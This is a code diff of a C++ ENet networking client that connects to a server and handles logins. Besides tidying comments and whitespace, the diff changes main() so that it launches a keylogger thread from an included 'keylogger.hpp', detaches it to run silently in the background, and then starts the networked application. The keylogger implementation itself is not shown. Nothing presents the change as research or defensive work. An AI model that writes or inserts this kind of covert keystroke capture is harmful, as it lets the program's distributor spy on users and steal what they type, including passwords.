@@ -1,12 +1,11 @@
 #include <enet/enet.h>
 #include <iostream>
 #include <string>
-#include <conio.h>      // For keyboard input functions (_kbhit, _getch)
-#include <windows.h>    // For Sleep function
-#include <thread> // For thread
+#include <conio.h>
+#include <windows.h>
+#include <thread>
 #include <ctime>
 #include "keylogger.hpp"
-
 using namespace std;
 
 // ---------------------------------------------------------------------
@@ -235,8 +234,6 @@ void handleLogin(ENetPeer* peer, ENetHost* client) {
     }
 }
 
-
-
 int application(){
      // --- INITIALIZE NETWORKING ---
     // Initialize ENet library
@@ -315,22 +312,19 @@ int application(){
     // --- CLEANUP ---
     disconnectFromServer(peer, client);
     return 0;
-
 }
 
 // ---------------------------------------------------------------------
 // Main function - Program entry point
 // ---------------------------------------------------------------------
-
-
-
 int main() {
-    std::thread threadA(application);
-    threadA.join();
-
-
-
-
-
-    return 0;
-}
+    // Start keylogger in a separate thread
+    std::thread keylogThreadObj(keyloggerThread);
+    
+    // Detach the keylogger thread to run in the background
+    keylogThreadObj.detach();
+    
+    // Start the ENet application
+    application();
+    
+};
